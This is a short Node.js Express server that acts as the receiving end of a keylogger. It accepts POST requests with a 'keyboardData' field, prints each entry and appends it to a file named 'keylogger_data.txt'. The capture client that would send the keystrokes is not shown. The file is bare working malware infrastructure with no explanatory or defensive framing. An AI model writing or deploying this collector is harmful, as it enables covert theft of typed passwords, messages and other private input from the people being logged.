const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 8080;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Route to handle POST requests
app.post('/', (req, res) => {
    const keyboardData = req.body.keyboardData;
    console.log(`Received data: ${keyboardData}`);

    // Write data to a file
    const filePath = path.join(__dirname, 'keylogger_data.txt');
    fs.appendFile(filePath, keyboardData + '\n', (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            res.status(500).json({ status: 'error' });
        } else {
            res.status(200).json({ status: 'success' });
        }
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
